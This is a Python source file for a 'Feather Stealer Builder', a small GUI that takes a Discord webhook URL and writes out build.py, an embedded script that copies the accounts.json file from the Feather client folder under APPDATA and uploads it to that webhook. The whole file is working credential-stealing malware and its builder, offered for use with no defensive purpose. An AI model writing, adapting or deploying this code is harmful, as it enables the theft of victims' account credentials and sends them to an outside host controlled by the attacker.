from tkinter import messagebox
import customtkinter as ctk

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

code = '''
import os
import shutil
from discord_webhook import DiscordWebhook

wh = 'your_webhook_here'

def retrieve_file(source_path, destination_path):
    try:
        full_source_path = os.path.join(os.getenv('APPDATA'), source_path)

        if os.path.exists(full_source_path):
            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
            shutil.copy(full_source_path, destination_path)
            print(f"File successfully retrieved and saved to {destination_path}")
        else:
            print("Source file does not exist.")
    except Exception as e:
        print(f"An error occurred: {e}")

source_file_path = ".feather\\accounts.json"
destination_file_path = "c:/stealer/accounts.json"
retrieve_file(source_file_path, destination_file_path)

webhook = DiscordWebhook(url=wh, username="Feather Stealer")

with open("c:/stealer/accounts.json", "rb") as f:
    webhook.add_file(file=f.read(), filename="accounts.json")

response = webhook.execute()
'''
class BuilderApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Feather Stealer Builder")
        self.geometry("600x300")

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.create_widgets()

    def create_widgets(self):
        self.sidebar_frame = ctk.CTkFrame(self, width=200, corner_radius=0, bg_color="#1f1f1f")
        self.sidebar_frame.grid(row=0, column=0, sticky="nswe")

        self.logo_label = ctk.CTkLabel(self.sidebar_frame, text="Feather Stealer Builder", font=("Helvetica", 20, "bold"))
        self.logo_label.place(relx=0.5, rely=0.1, anchor="n")

        self.webhook_label = ctk.CTkLabel(self.sidebar_frame, text="Your webhook:")
        self.webhook_label.place(relx=0.5, rely=0.3, anchor="n")

        self.webhook_entry = ctk.CTkEntry(self.sidebar_frame, placeholder_text="Enter webhook")
        self.webhook_entry.place(relx=0.5, rely=0.4, anchor="n")

        self.build_button = ctk.CTkButton(self.sidebar_frame, text="Build", command=self.build)
        self.build_button.place(relx=0.5, rely=0.5, anchor="n")

    def build(self):
        webhook = self.webhook_entry.get()
        if webhook:
            modified_code = code.replace("wh = 'your_webhook_here'", f"wh = '{webhook}'")

            with open('build.py', 'w') as file:
                file.write(modified_code)

            # Notify the user
            messagebox.showinfo("Success", "Code modified successfully!")
        else:
            messagebox.showwarning("Warning", "Please enter a webhook.")

if __name__ == "__main__":
    app = BuilderApp()
    app.mainloop()
